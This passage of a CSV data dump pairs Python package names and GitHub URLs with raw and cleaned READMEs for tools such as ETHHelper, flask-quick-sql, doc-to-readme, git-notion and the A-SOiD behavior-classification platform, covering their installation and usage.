",amirrezasokhankhosh/pyfed
ethhelper,https://github.com/XiaoHuiHui233/ETHHelper,6,1704,1704,"# ETHHelper

[![Build Status](https://img.shields.io/github/actions/workflow/status/XiaoHuiHui233/ETHHelper/publish.yml)](https://github.com/XiaoHuiHui233/ETHHelper/actions)
[![Documentation Status](https://readthedocs.org/projects/ethhelper/badge/?version=latest)](https://ethhelper.readthedocs.io/en/latest/?badge=latest)
![Python Version](https://img.shields.io/pypi/pyversions/ethhelper)
![Wheel Status](https://img.shields.io/pypi/wheel/ethhelper)
[![Latest Version](https://img.shields.io/github/v/release/XiaoHuiHui233/ETHHelper)](https://github.com/XiaoHuiHui233/ETHHelper/releases)
[![License](https://img.shields.io/github/license/XiaoHuiHui233/ETHHelper)](https://github.com/XiaoHuiHui233/ETHHelper/blob/main/LICENSE)

Asynchronous Geth node connection encapsulation based on httpx, websockets and web3.py. Geth node and Ethereum type extension based on pydantic.

Quickstart see [this](https://ethhelper.readthedocs.io/en/latest/quickstart.html).

[中文](docs/README_cn.md) | English

## Usage

### pypi

If you prefer to use pypi to install this package, you can just run the following command:

```bash
pip install ethhelper
```

### git

The project is managed by poetry. If you prefer to use git to install this package, you can use poetry to directly add a reference to the project's build package through git.

The command is as follow:

```bash
poetry add git+ssh://git@github.com:XiaoHuiHui233/ETHHelper.git
```

## Build

You can use poetry's tools to generate a build of this project (pure Python).

The command is as follow:

```bash
poetry build
```

## Author and License

ETHHelper was written by [XiaoHuiHui233](https://github.com/XiaoHuiHui233/), licensed under the Apache 2.0.
","# ETHHelper

[![Build Status](https://img.shields.io/github/actions/workflow/status/XiaoHuiHui233/ETHHelper/publish.yml)](https://github.com/XiaoHuiHui233/ETHHelper/actions)
[![Documentation Status](https://readthedocs.org/projects/ethhelper/badge/?version=latest)](https://ethhelper.readthedocs.io/en/latest/?badge=latest)
![Python Version](https://img.shields.io/pypi/pyversions/ethhelper)
![Wheel Status](https://img.shields.io/pypi/wheel/ethhelper)
[![Latest Version](https://img.shields.io/github/v/release/XiaoHuiHui233/ETHHelper)](https://github.com/XiaoHuiHui233/ETHHelper/releases)
[![License](https://img.shields.io/github/license/XiaoHuiHui233/ETHHelper)](https://github.com/XiaoHuiHui233/ETHHelper/blob/main/LICENSE)

Asynchronous Geth node connection encapsulation based on httpx, websockets and web3.py. Geth node and Ethereum type extension based on pydantic.

Quickstart see [this](https://ethhelper.readthedocs.io/en/latest/quickstart.html).

[中文](docs/README_cn.md) | English

## Usage

### pypi

If you prefer to use pypi to install this package, you can just run the following command:

```bash
pip install ethhelper
```

### git

The project is managed by poetry. If you prefer to use git to install this package, you can use poetry to directly add a reference to the project's build package through git.

The command is as follow:

```bash
poetry add git+ssh://git@github.com:XiaoHuiHui233/ETHHelper.git
```

## Build

You can use poetry's tools to generate a build of this project (pure Python).

The command is as follow:

```bash
poetry build
```

## Author and License

ETHHelper was written by [XiaoHuiHui233](https://github.com/XiaoHuiHui233/), licensed under the Apache 2.0.
",xiaohuihui233/ethhelper
flask-quick-sql,https://github.com/le717/flask-quick-sql,2,2581,2581,"# flask-quick-sql

> A quick way to run SQL in your Flask app.

## Info

A long time ago, I used the [`records`](https://pypi.org/project/records/) library to query a database
with raw SQL. It was great, [until it wasn't](https://github.com/kennethreitz/records/issues/208).

Fast-forward many years and I was working on replacing the code that used `records`, but I needed to keep
the existing code working. I also needed to remove `records` from my dependencies in order to update
literally _everything_, but alas, I could not.

Enter this little wrapper code I wrote. It _kinda_ keeps API compat but also kinda not.
That wasn't my goal. My goal was to keep _enough_ compatibility so I wouldn't have to
change much of my code while also keeping it nice to use.

This Flask extension exists solely because I liked my wrapper code and will
almost certainly will have a use for it again, and I didn't want it to just go away
when I deleted it from my app.

## Usage

* Python 3.10+
* Flask 2.2+
* Flask-SQLAlchemy 3.0+
* SQLAlchemy 2.0+

If a SQLAlchemy instance already exists in your app, it will be used. Otherwise, an instance
will be created for you.

```python
from flask import Flask
from flask_quick_sql import QuickSQL


def create_app():
    app = Flask(__name__)

    # You must set this
    app.config[""SQLALCHEMY_DATABASE_URI""] = ...
    db = QuickSQL(app)

    # A very wasteful yet all too common query, especially in PHP land
    all_users = db.query(""SELECT * FROM users"").all()
    print(all_users[0][""username""])

    return app
```

The immediate result of `query()` isn't very useful. You'll want to chain a call to `.all()`, `.first()`,
or `.one()`. If there's no data, `.first()` and `.one()` will return `None`.

You don't get property and key access like `records` gave you. You get one or the other.
By default, you get a dictionary. Breaking API change from `records`? Yes. I don't care.

To get a `sqlalchemy.engine.Row` (basically `collections.namedtuple`) object instead,
pass `as_nt=True` as a parameter to any method.

You can also iterate over the whole result set, with each dictionary record being `yield`ed
(you cannot get a named tuple when doing this):

```python
[User(**r) for r in quick_sql.query(""SELECT * FROM users"")]
```

Because SQLAlchemy is used under the hood, prepared statements work as expected:

```python
sql = ""SELECT * FROM users WHERE is_active = :is_active""
[User(**r) for r in db.query(sql, is_active=False)]
```

Have fun running your [SQuirreL](http://www.squirrelsql.org/) queries.

## License

[Public domain](LICENSE)
","# flask-quick-sql

> A quick way to run SQL in your Flask app.

## Info

A long time ago, I used the [`records`](https://pypi.org/project/records/) library to query a database
with raw SQL. It was great, [until it wasn't](https://github.com/kennethreitz/records/issues/208).

Fast-forward many years and I was working on replacing the code that used `records`, but I needed to keep
the existing code working. I also needed to remove `records` from my dependencies in order to update
literally _everything_, but alas, I could not.

Enter this little wrapper code I wrote. It _kinda_ keeps API compat but also kinda not.
That wasn't my goal. My goal was to keep _enough_ compatibility so I wouldn't have to
change much of my code while also keeping it nice to use.

This Flask extension exists solely because I liked my wrapper code and will
almost certainly will have a use for it again, and I didn't want it to just go away
when I deleted it from my app.

## Usage

* Python 3.10+
* Flask 2.2+
* Flask-SQLAlchemy 3.0+
* SQLAlchemy 2.0+

If a SQLAlchemy instance already exists in your app, it will be used. Otherwise, an instance
will be created for you.

```python
from flask import Flask
from flask_quick_sql import QuickSQL


def create_app():
    app = Flask(__name__)

    # You must set this
    app.config[""SQLALCHEMY_DATABASE_URI""] = ...
    db = QuickSQL(app)

    # A very wasteful yet all too common query, especially in PHP land
    all_users = db.query(""SELECT * FROM users"").all()
    print(all_users[0][""username""])

    return app
```

The immediate result of `query()` isn't very useful. You'll want to chain a call to `.all()`, `.first()`,
or `.one()`. If there's no data, `.first()` and `.one()` will return `None`.

You don't get property and key access like `records` gave you. You get one or the other.
By default, you get a dictionary. Breaking API change from `records`? Yes. I don't care.

To get a `sqlalchemy.engine.Row` (basically `collections.namedtuple`) object instead,
pass `as_nt=True` as a parameter to any method.

You can also iterate over the whole result set, with each dictionary record being `yield`ed
(you cannot get a named tuple when doing this):

```python
[User(**r) for r in quick_sql.query(""SELECT * FROM users"")]
```

Because SQLAlchemy is used under the hood, prepared statements work as expected:

```python
sql = ""SELECT * FROM users WHERE is_active = :is_active""
[User(**r) for r in db.query(sql, is_active=False)]
```

Have fun running your [SQuirreL](http://www.squirrelsql.org/) queries.

## License

[Public domain](LICENSE)
",le717/flask-quick-sql
doc-to-readme,https://github.com/ziselsberger/doc_to_readme,0,3512,3502,"# Automated (Python) Module Documentation in README

## What's this?

Automated docstring extraction and creation/update of documentation (of python modules) in README File.

### Why?

Because it's nice :-)

### How?

[doc_to_md.py](src/doc_to_md/doc_to_md.py) loops through all Python files in the Repository and extracts the function calls + the
corresponding short description from the docstrings. These are added to a dictionary and afterwards converted to
a Markdown Table. Finally, the section **_Functions & Classes_** is appended / updated in the README File.

> There are several options how to use it:  
> a) [Python Package](#a-install--use-python-package)   
> b) [CI Pipeline](#b-add-to-pipeline-github-gitlab-or-bitbucket)  


### a) install & use Python Package

Available on [PyPI](https://pypi.org/project/doc-to-readme)
```shell
pip install doc-to-readme
```

- **Use within Python** 
```python
import doc_to_md.doc_to_md as dtm

dtm.update_markdown_file(
    file=""README.md"",
    root_dir=None,              # Directory used as root for searching modules, defaults to folder containing README.md
    exclude_modules=None,       # List of modules to be excluded
    specified_modules=None,     # Only these modules will be included
    separate=True               # Create one table per module
)
```

- **Command Line**
```shell
python -m doc_to_md.doc_to_md -f ""README.md"" [-r ROOT_DIR] [-e EXCLUDE_MODULES] [-m SELECTED_MODULES] [--separated]

-r ROOT_DIR             # Directory used as root for searching modules, defaults to folder containing README.md
-e EXCLUDE_MODULES      # List of modules to be excluded
-s SELECTED_MODULES     # Only these modules will be included
--separated             # Create one table per module
```

---

### b) add to Pipeline (GitHub, GitLab or Bitbucket)
_[Documentation](https://github.com/ziselsberger/doc_to_readme/blob/main/How_to_setup_the_pipelines.md) on how to set up the pipelines to update a file on every push._

> ### [**_Step-by-step guide_**](https://github.com/ziselsberger/use_doc_to_readme) on how to integrate _doc_to_readme_ in your Repository

---

_Copyright &copy; 2023 by Mirjam Ziselsberger_  
_This code is free to use under the terms of the [MIT license](/LICENSE)._

## Functions & Classes  

### [doc_to_md.py](./src/doc_to_md/doc_to_md.py)

| Type | Name/Call | Description |
| --- | --- | --- |
| function  | `loop_through_repo(file: str, root_dir: str = None, exclude_modules: Optional[Tuple[str, ...]] = None, specified_modules: Optional[Tuple[str, ...]] = None) -> None` | Collect documentation from functions & classes |
| function  | `add_summary_to_md(overview_dict: Dict[str, Optional[Union[str, Dict[str, str]]]], markdown: str, separate: bool = True)` | Add Table with all Functions & Classes to Markdown file. |
| function  | `update_markdown_file(file: str = ""../../README.md"", root_dir: str = None, exclude_modules: Optional[Tuple[str, ...]] = (""test"", ""functions_for_testing"", ""classes_for_testing"", ""doc_to_md""), specified_modules: Optional[Tuple[str, ...]] = None, separate: bool = True)` | Add/update 'Functions & Classes' Section in Markdown file. |
| function  | `parse_through_file(file: str) -> Dict[str, Dict[str, str]]` | Parse through module and gather info on classes and functions |

Created with: [doc_to_readme](https://github.com/ziselsberger/doc_to_readme)  
[MIT](https://github.com/ziselsberger/doc_to_readme/blob/main/LICENSE) &copy; 2023 Mirjam Ziselsberger

---
**Last Update:** 2023-04-29
","# Automated (Python) Module Documentation in README

## What's this?

Automated docstring extraction and creation/update of documentation (of python modules) in README File.

### Why?

Because it's nice :-)

### How?

[doc_to_md.py](src/doc_to_md/doc_to_md.py) loops through all Python files in the Repository and extracts the function calls + the
corresponding short description from the docstrings. These are added to a dictionary and afterwards converted to
a Markdown Table. Finally, the section **_Functions & Classes_** is appended / updated in the README File.

> There are several options how to use it:  
> a) [Python Package](#a-install--use-python-package)   
> b) [CI Pipeline](#b-add-to-pipeline-github-gitlab-or-bitbucket)  


### a) install & use Python Package

Available on [PyPI](https://pypi.org/project/doc-to-readme)
```shell
pip install doc-to-readme
```

- **Use within Python** 
```python
import doc_to_md.doc_to_md as dtm

dtm.update_markdown_file(
    file=""README.md"",
    root_dir=None,              # Directory used as root for searching modules, defaults to folder containing README.md
    exclude_modules=None,       # List of modules to be excluded
    specified_modules=None,     # Only these modules will be included
    separate=True               # Create one table per module
)
```

- **Command Line**
```shell
python -m doc_to_md.doc_to_md -f ""README.md"" [-r ROOT_DIR] [-e EXCLUDE_MODULES] [-m SELECTED_MODULES] [--separated]

-r ROOT_DIR             # Directory used as root for searching modules, defaults to folder containing README.md
-e EXCLUDE_MODULES      # List of modules to be excluded
-s SELECTED_MODULES     # Only these modules will be included
--separated             # Create one table per module
```

---

### b) add to Pipeline (GitHub, GitLab or Bitbucket)
_[Documentation](https://github.com/ziselsberger/doc_to_readme/blob/main/How_to_setup_the_pipelines.md) on how to set up the pipelines to update a file on every push._

> ### [**_Step-by-step guide_**](https://github.com/ziselsberger/use_doc_to_readme) on how to integrate _doc_to_readme_ in your Repository

---

_Copyright © 2023 by Mirjam Ziselsberger_  
_This code is free to use under the terms of the [MIT license](/LICENSE)._

## Functions & Classes  

### [doc_to_md.py](./src/doc_to_md/doc_to_md.py)

| Type | Name/Call | Description |
| --- | --- | --- |
| function  | `loop_through_repo(file: str, root_dir: str = None, exclude_modules: Optional[Tuple[str, ...]] = None, specified_modules: Optional[Tuple[str, ...]] = None) -> None` | Collect documentation from functions & classes |
| function  | `add_summary_to_md(overview_dict: Dict[str, Optional[Union[str, Dict[str, str]]]], markdown: str, separate: bool = True)` | Add Table with all Functions & Classes to Markdown file. |
| function  | `update_markdown_file(file: str = ""../../README.md"", root_dir: str = None, exclude_modules: Optional[Tuple[str, ...]] = (""test"", ""functions_for_testing"", ""classes_for_testing"", ""doc_to_md""), specified_modules: Optional[Tuple[str, ...]] = None, separate: bool = True)` | Add/update 'Functions & Classes' Section in Markdown file. |
| function  | `parse_through_file(file: str) -> Dict[str, Dict[str, str]]` | Parse through module and gather info on classes and functions |

Created with: [doc_to_readme](https://github.com/ziselsberger/doc_to_readme)  
[MIT](https://github.com/ziselsberger/doc_to_readme/blob/main/LICENSE) © 2023 Mirjam Ziselsberger

---
**Last Update:** 2023-04-29
",ziselsberger/doc_to_readme
django-database-cipher,https://github.com/raisons/django-database-cipher,0,63,63,"This module allows your Django project to work with SQLCipher.
","This module allows your Django project to work with SQLCipher.
",raisons/django-database-cipher
git-notion-pretty,https://github.com/Harbor-Systems/git-notion,2,2706,2674,"Git Notion
==========

Syncs Github markdown files in your repository to Notion.

This utility is described in the following [blog post](https://www.swiftlane.com/blog/syncing-docs-from-code-repositories-to-notion/).

See example [Notion page](https://www.notion.so/git_notion-195c08d3d14140eb9a35ac00f9a0f078).

## Installation
```bash
pip install git-notion
pip install notion-cobertos-fork # IMPORTANT due to a md2notion notion-py dependency. Order also matters
```

or for local installation:

```bash
git clone https://github.com/Harbor-Systems/git-notion.git
cd git-notion
pip install -e .
```

## Configuring

`NOTION_TOKEN_V2` - Can be found in your [browser cookies](https://www.redgregory.com/notion/2020/6/15/9zuzav95gwzwewdu1dspweqbv481s5) for Notion's website.<br>
`NOTION_ROOT_PAGE` - URL for notion page. Repo docs will be a new page under this page.<br>
`NOTION_EXCLUDE_REGEX` - Regex for paths to ignore.<br>
`NOTION_INCLUDE_REGEX` - Regex for paths to include.<br>
`NOTION_CONFIG_PATH` - Path to the setup.cfg file.<br>

These environment variables can be set.
```bash
export NOTION_TOKEN_V2=<YOUR_TOKEN>
export NOTION_ROOT_PAGE=""https://www.notion.so/...""  # Can be in setup.cfg as well
export NOTION_IGNORE_REGEX=""(?i)(vendor\/.*\.md|deleteme\.md)"" # Can be in setup.cfg as well
export NOTION_INCLUDE_REGEX=""(?i)(docs\/.*\.md|readme\.md)"" # Can be in setup.cfg as well
export NOTION_CONFIG_PATH=""docs/""
```

These parameters can be set in the `setup.cfg` for the repo.
```
[git-notion]
ignore_regex = models/.*
include_regex = docs/.*
notion_root_page = https://www.notion.so/...
```

## Running Locally

1. Set up a virtual environment
```shell
python3 -m pip install virtualenv # only do this the first time
```
2. Create a virtual environment
```shell
python3 -m virtualenv venv
```
3. Activate the virtual environment
```shell
source venv/bin/activate
```
4. Install the dependencies
```shell
python3 -m pip install -r requirements.in
```
5. Set any environment variables and run the command
```shell
export NOTION_TOKEN_V2=<...>
export NOTION_ROOT_PAGE=""https://www.notion.so/...""
python3 git-notion-pretty/cli.py [options]
```

## Usage

```bash
# To upload your current directory
git-notion-pretty

# To upload to a different directory name
git-notion-pretty --dir-name=""Application Docs""

# To use a flat structure instead of the nested structure
git-notion-pretty --page-structure=flat

# To use the file name instead searching for and using the H1 header on the first line
git-notion-pretty --use-file-name
```

## Pushing to PYPI

```bash
python3 -m bumpversion patch   # Look-up bumpversion
rm -rf dist/
python3 setup.py sdist bdist_wheel
python3 -m twine upload dist/*
```
","Git Notion
==========

Syncs Github markdown files in your repository to Notion.

This utility is described in the following [blog post](https://www.swiftlane.com/blog/syncing-docs-from-code-repositories-to-notion/).

See example [Notion page](https://www.notion.so/git_notion-195c08d3d14140eb9a35ac00f9a0f078).

## Installation
```bash
pip install git-notion
pip install notion-cobertos-fork # IMPORTANT due to a md2notion notion-py dependency. Order also matters
```

or for local installation:

```bash
git clone https://github.com/Harbor-Systems/git-notion.git
cd git-notion
pip install -e .
```

## Configuring

`NOTION_TOKEN_V2` - Can be found in your [browser cookies](https://www.redgregory.com/notion/2020/6/15/9zuzav95gwzwewdu1dspweqbv481s5) for Notion's website.
`NOTION_ROOT_PAGE` - URL for notion page. Repo docs will be a new page under this page.
`NOTION_EXCLUDE_REGEX` - Regex for paths to ignore.
`NOTION_INCLUDE_REGEX` - Regex for paths to include.
`NOTION_CONFIG_PATH` - Path to the setup.cfg file.

These environment variables can be set.
```bash
export NOTION_TOKEN_V2=
export NOTION_ROOT_PAGE=""https://www.notion.so/...""  # Can be in setup.cfg as well
export NOTION_IGNORE_REGEX=""(?i)(vendor\/.*\.md|deleteme\.md)"" # Can be in setup.cfg as well
export NOTION_INCLUDE_REGEX=""(?i)(docs\/.*\.md|readme\.md)"" # Can be in setup.cfg as well
export NOTION_CONFIG_PATH=""docs/""
```

These parameters can be set in the `setup.cfg` for the repo.
```
[git-notion]
ignore_regex = models/.*
include_regex = docs/.*
notion_root_page = https://www.notion.so/...
```

## Running Locally

1. Set up a virtual environment
```shell
python3 -m pip install virtualenv # only do this the first time
```
2. Create a virtual environment
```shell
python3 -m virtualenv venv
```
3. Activate the virtual environment
```shell
source venv/bin/activate
```
4. Install the dependencies
```shell
python3 -m pip install -r requirements.in
```
5. Set any environment variables and run the command
```shell
export NOTION_TOKEN_V2=<...>
export NOTION_ROOT_PAGE=""https://www.notion.so/...""
python3 git-notion-pretty/cli.py [options]
```

## Usage

```bash
# To upload your current directory
git-notion-pretty

# To upload to a different directory name
git-notion-pretty --dir-name=""Application Docs""

# To use a flat structure instead of the nested structure
git-notion-pretty --page-structure=flat

# To use the file name instead searching for and using the H1 header on the first line
git-notion-pretty --use-file-name
```

## Pushing to PYPI

```bash
python3 -m bumpversion patch   # Look-up bumpversion
rm -rf dist/
python3 setup.py sdist bdist_wheel
python3 -m twine upload dist/*
```
",harbor-systems/git-notion
jiggybase,https://github.com/jiggy-ai/jiggybase,3,0,0,,,jiggy-ai/jiggybase
pingsafecli,https://github.com/bridgecrewio/checkov,7,6,6,"hello
","hello
",bridgecrewio/checkov
asoid,https://github.com/YttriLab/A-SOID,24,13174,13119,"# A-SOiD: An active learning platform for expert-guided, data efficient discovery of behavior.

[![GitHub stars](https://img.shields.io/github/stars/YttriLab/A-SOID.svg?style=social&label=Star)](https://github.com/YttriLab/A-SOID)
[![GitHub forks](https://img.shields.io/github/forks/YttriLab/A-SOID.svg?style=social&label=Fork)](https://github.com/YttriLab/A-SOID)

### Read the [preprint](https://www.biorxiv.org/content/10.1101/2022.11.04.515138v1)!

[DeepLabCut](https://github.com/AlexEMG/DeepLabCut) <sup>1,2,3</sup>, 
[SLEAP](https://github.com/murthylab/sleap) <sup>4</sup>, and 
[OpenPose](https://github.com/CMU-Perceptual-Computing-Lab/openpose) <sup>5</sup> 
have revolutionized the way behavioral scientists analyze data. 
These algorithm utilizes recent advances in computer vision and deep learning to automatically estimate 3D-poses. 
Interpreting the positions of an animal can be useful in studying behavior; 
however, it does not encompass the whole dynamic range of naturalistic behaviors. 

Behavior identification and quantification techniques have undergone rapid development.
To this end, supervised or unsupervised methods (such as [B-SOiD](https://github.com/YttriLab/B-SOID)<sup>6</sup> ) are chosen based upon their intrinsic strengths and weaknesses 
(e.g. user bias, training cost, complexity, action discovery).

Here, a new active learning platform, A-SOiD, blends these strengths and in doing so,
overcomes several of their inherent drawbacks. A-SOiD iteratively learns user-defined
groups with a fraction of the usual training data while attaining expansive classification
through directed unsupervised classification.

To facilitate use, A-SOiD comes as an intuitive, open-source interface for efficient segmentation
of user-defined behaviors and discovered subactions.

## Overview: 

![DLS_Stim](asoid/images/GUI_overview.png)

A-SOiD is a streamlit-based application that integrates the core features of [A-SOiD](https://www.biorxiv.org/content/10.1101/2022.11.04.515138v1) into a user-friendly,
no-coding required GUI solution that can be downloaded and used on custom data.


For this we developed a multi-step pipeline that guides users, independent of their previous machine learning abilities
through the process of generating a well-trained, semi-supervised classifier for their own use-case.

In general, users are required to provide a small labeled data set (ground truth) with behavioral categories of
their choice using one of the many available labeling tools (e.g. [BORIS](https://www.boris.unito.it/)<sup>7</sup> ) or
import their previous supervised machine learning data sets. Following the upload of data
(see Fig. above, a), a A-SOiD project is created, including several parameters that further enable
users to select individual animals (in social data) and exclude body parts from the feature extraction.


Based on the configuration, the feature extraction (see Fig. below, b top) can be further customized
by defining a ""bout length"" referring to the temporal resolution in which single motifs are expected to appear
(e.g. the shortest duration a definable component of the designated behavior is expected to last).
The extracted features are then used in combination with the labeled ground truth to train a baseline model.
Here, an initial evaluation will give users insight into the performance on their base data set (see Fig. above, b bottom).
Note, that different splits are used to allow for a more thorough analysis (see Publication Methods for further details).


The baseline classification will then be used as a basis for the first active learning iteration,
where users are prompted by the app to view and refine bouts that were classified with low confidence
by the baseline model (see Fig. above,c left). Bouts are visualized by showing an animated sequence
of the provided pose information and designated body parts and the viewer can be utilized to show the bouts
in several options, including increased/decreased speed, reverse view and frame-by-frame view.
After submission of a refined bout, a new bout is shown at its place and the refinement continues for
a user-defined amount of low confidence bouts. Following refinement, a new iteration of the model is trained
and its performance can be viewed (see Fig. above,c right) in comparison to previous iterations.
This process is then repeated until the user is satisfied with the model's performance or until a plateau
has been reached (see publication).
\newline

Finally, users can upload and classify new data using the app and the previously trained classifier
(see Fig. above,d). To gain further insight into the results of the classification,
the app offers a reporting tab that allows users to view results (see Fig. above,d).

## Input:

A-SOiD supports the following input types:

### Pose estimation:
- [SLEAP](https://sleap.ai/)
- [DeepLabCut](http://www.mackenziemathislab.org/deeplabcut)

### Annotation files:
- [BORIS](https://www.boris.unito.it/) -> exported as binary files in 0.1 sec time steps (10 Hz): [Read the docs](https://boris.readthedocs.io/en/latest/#export-events-as-behavioral-binary-table)
- any annotation files in this style ([one-hot encoded](https://en.wikipedia.org/wiki/One-hot)), including an index that specifies time steps in seconds.
----
> You can see an example of this using pandas in our docs: [Convert annotations to binary format](docs/export_annotations_to_binary_format.ipynb)
---

## System Requirements
### Hardware requirements
A-SOiD requires only a standard computer with enough RAM to support the model training during active learning. For clustering, CPU and RAM requirements are increased. Refer to [B-SOiD](https://github.com/YttriLab/B-SOID) or our paper for details. 

### Software requirements
#### OS Requirements
This package is supported for *Windows* but can be run on *Linux* computers given additional installation of require packages.

#### Python Dependencies
For dependencies please refer to the requirements.txt file. No additional requirements.

## Installation

There are two ways to install A-SOiD. Installation will only take a couple of minutes. We recommend using a fresh environment in any case to avoid any installation conflicts.
To simplify the process, we provide `asoid.yml` file that will do everything for you (see below).

### Download repository and install locally as python package within a new environment

Clone this repository and create a new environment in which A-SOiD will be installed automatically (recommended) [Anaconda/Python3](https://www.anaconda.com/).

#### Change your current working directory to the location where you want the directory to be made.
````
cd path/to/A-SOiD
````
Clone it directly from GitHub
```bash
git clone https://github.com/YttriLab/A-SOID.git
```
or download ZIP and unpack where you want. 

#### Create an environment using anaconda:
````
conda env create --file asoid.yml
````

#### Alternatively, you can install A-SOiD locally 
in the directory you saved the repo in:
````
cd path/to/A-SOiD
````
activate the environment, you want to install A-SOiD in:
````
conda activate MYENVIRONMENT
````
install using `setup.py` in your own environment:
````
pip install .
````

A-SOiD is installed alongside all dependencies.

## Updating A-SOiD

1. Download or clone the latest version of A-SOiD from this repository.

2. Activate the environment you installed A-SOiD in.
````
conda activate asoid
````
3. Go to the locotion of that you unpacked the latest version at.
````
cd path/to/A-SOiD
````
4. Install the new version on-top of the other using `setup.py`:
````
pip install .
````
The console output should look like this:

    Successfully built asoid
    Installing collected packages: asoid
      Attempting uninstall: asoid
        Found existing installation: asoid 0.1
        Uninstalling asoid-0.1:
          Successfully uninstalled asoid-0.1
    Successfully installed asoid-0.2.0

You can start A-SOiD again and use the new version just like before.

## How to start A-SOiD:

````
conda activate asoid
````

You can run A-SOiD now from inside your environment by using (you do not have change directories anymore):
````
asoid app
````
## Demo:

We invite you to test A-SOiD using the [CalMS21](https://data.caltech.edu/records/s0vdx-0k302) data set. The data set can be used within the app by simply specifying the path to the train and test set files (see below). While you can reproduce our figures using the provided notebooks, the data set also allows an easy first use case to get familiar with all significant steps in A-SOiD.

1. Download the data set and convert it into npy format using their provided script.
2. Run A-SOiD and select 'CalMS21 (paper)' in the `Upload Data` tab.
3. Enter the full path to both train and test files from the first challenge (e.g. 'C:\Dataset\task1_classic_classification\calms21_task1_train.npy' and 'C:\Dataset\task1_classic_classification\calms21_task1_test.npy').
4. Enter a directory and prefix to create the A-SOiD project in.
5. Click on 'Preprocess' and follow the remaining workflow of the app. After successful importing the data set, you can now run the CalMS21 project as any other project in A-SOiD. 

The overall runtime depends on your setup and parameters set during training, but should be completed within 1h of starting the project.
Tested on: AMD Ryzen 9 6900HX 3.30 GHz and 16 GB RAM; Windows 11 Home


---
## Contributors:

A-SOiD was developed as a collaboration between the Yttri Lab and Schwarz Lab by:

[Jens Schweihoff](https://github.com/JensBlack), University Bonn

[Alex Hsu](https://github.com/runninghsus), Carnegie Mellon University

[Martin Schwarz](https://github.com/SchwarzNeuroconLab), University Bonn

[Eric Yttri](https://github.com/YttriLab), Carnegie Mellon University

---
## Get in contact:

### Corresponding authors:

Martin K. Schwarz [SchwarzLab](https://ieecr-bonn.de/ieecr-groups/schwarz-group/)

Eric A. Yttri [YttriLab](https://labs.bio.cmu.edu/yttri/)

### Contributing

For recommended changes that you would like to see, open an issue. 

There are many exciting avenues to explore based on this work. 
Please do not hesitate to contact us for collaborations.

### Issues running A-SOiD
If you are having issues, please refer to our issue page first, to see whether a similar issue was already solved.
If this does not apply to your problem, please submit an issue with enough information that we can replicate it. Thank you!

## License
A-SOiD is released under a [Clear BSD License](https://github.com/YttriLab/A-SOID/blob/main/LICENSE) and is intended for research/academic use only.

---

## References
If you are using our work, please make sure to cite us and any additional resources you were using

1. [Mathis A, Mamidanna P, Cury KM, Abe T, Murthy VN, Mathis MW, Bethge M. DeepLabCut: markerless pose estimation of user-defined body parts with deep learning. Nat Neurosci. 2018 Sep;21(9):1281-1289. doi: 10.1038/s41593-018-0209-y. Epub 2018 Aug 20. PubMed PMID: 30127430.](https://www.nature.com/articles/s41593-018-0209-y)

2. [Nath T, Mathis A, Chen AC, Patel A, Bethge M, Mathis MW. Using DeepLabCut for 3D markerless pose estimation across species and behaviors. Nat Protoc. 2019 Jul;14(7):2152-2176. doi: 10.1038/s41596-019-0176-0. Epub 2019 Jun 21. PubMed PMID: 31227823.](https://doi.org/10.1038/s41596-019-0176-0)

3. [Insafutdinov E., Pishchulin L., Andres B., Andriluka M., Schiele B. (2016) DeeperCut: A Deeper, Stronger, and Faster Multi-person Pose Estimation Model. In: Leibe B., Matas J., Sebe N., Welling M. (eds) Computer Vision â€“ ECCV 2016. ECCV 2016. Lecture Notes in Computer Science, vol 9910. Springer, Cham](http://arxiv.org/abs/1605.03170)

4. [Pereira, T.D., Tabris, N., Matsliah, A. et al. SLEAP: A deep learning system for multi-animal pose tracking. Nat Methods 19, 486â€“495 (2022).](https://doi.org/10.1038/s41592-022-01426-1)

5. [Cao Z, Hidalgo Martinez G, Simon T, Wei SE, Sheikh YA. OpenPose: Realtime Multi-Person 2D Pose Estimation using Part Affinity Fields. IEEE Trans Pattern Anal Mach Intell. 2019 Jul 17. Epub ahead of print. PMID: 31331883.](https://doi.org/10.1109/TPAMI.2019.2929257).
6. [Hsu AI, Yttri EA. B-SOiD, an open-source unsupervised algorithm for identification and fast prediction of behaviors. Nat Commun. 2021 Aug 31;12(1):5188](https://doi.org/10.1038/s41467-021-25420-x)
7. [Friard, O. and Gamba, M. (2016), BORIS: a free, versatile open-source event-logging software for video/audio coding and live observations.  Methods Ecol Evol, 7: 1325-1330](https://doi.org/10.1111/2041-210X.12584)

### How to cite us:
    A-SOiD, an active learning platform for expert-guided, data efficient discovery of behavior.
    Jens F. Schweihoff, Alexander I. Hsu, Martin K. Schwarz, Eric A. Yttri
    bioRxiv 2022.11.04.515138; doi: https://doi.org/10.1101/2022.11.04.515138

or see [Cite Us](CITATION)



","# A-SOiD: An active learning platform for expert-guided, data efficient discovery of behavior.

[![GitHub stars](https://img.shields.io/github/stars/YttriLab/A-SOID.svg?style=social&label=Star)](https://github.com/YttriLab/A-SOID)
[![GitHub forks](https://img.shields.io/github/forks/YttriLab/A-SOID.svg?style=social&label=Fork)](https://github.com/YttriLab/A-SOID)

### Read the [preprint](https://www.biorxiv.org/content/10.1101/2022.11.04.515138v1)!

[DeepLabCut](https://github.com/AlexEMG/DeepLabCut) 1,2,3, 
[SLEAP](https://github.com/murthylab/sleap) 4, and 
[OpenPose](https://github.com/CMU-Perceptual-Computing-Lab/openpose) 5 
have revolutionized the way behavioral scientists analyze data. 
These algorithm utilizes recent advances in computer vision and deep learning to automatically estimate 3D-poses. 
Interpreting the positions of an animal can be useful in studying behavior; 
however, it does not encompass the whole dynamic range of naturalistic behaviors. 

Behavior identification and quantification techniques have undergone rapid development.
To this end, supervised or unsupervised methods (such as [B-SOiD](https://github.com/YttriLab/B-SOID)6 ) are chosen based upon their intrinsic strengths and weaknesses 
(e.g. user bias, training cost, complexity, action discovery).

Here, a new active learning platform, A-SOiD, blends these strengths and in doing so,
overcomes several of their inherent drawbacks. A-SOiD iteratively learns user-defined
groups with a fraction of the usual training data while attaining expansive classification
through directed unsupervised classification.

To facilitate use, A-SOiD comes as an intuitive, open-source interface for efficient segmentation
of user-defined behaviors and discovered subactions.

## Overview: 

![DLS_Stim](asoid/images/GUI_overview.png)

A-SOiD is a streamlit-based application that integrates the core features of [A-SOiD](https://www.biorxiv.org/content/10.1101/2022.11.04.515138v1) into a user-friendly,
no-coding required GUI solution that can be downloaded and used on custom data.


For this we developed a multi-step pipeline that guides users, independent of their previous machine learning abilities
through the process of generating a well-trained, semi-supervised classifier for their own use-case.

